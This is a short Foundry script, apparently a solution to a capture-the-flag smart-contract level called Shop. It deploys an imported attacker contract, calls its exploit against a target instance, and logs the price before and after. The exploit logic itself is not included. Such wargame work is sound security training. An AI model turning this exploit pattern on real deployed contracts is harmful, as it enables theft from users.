// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/21_Shop.sol";
import "contracts/21_Shop.sol";

contract AttackerShopScript is Script {
    Shop shop = Shop(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        AttackerShop attackerShop = new AttackerShop();

        console.log("Current price :", shop.price());
        attackerShop.exploit(address(shop));
        console.log("    New price :", shop.price());

        vm.stopBroadcast();
    }
}
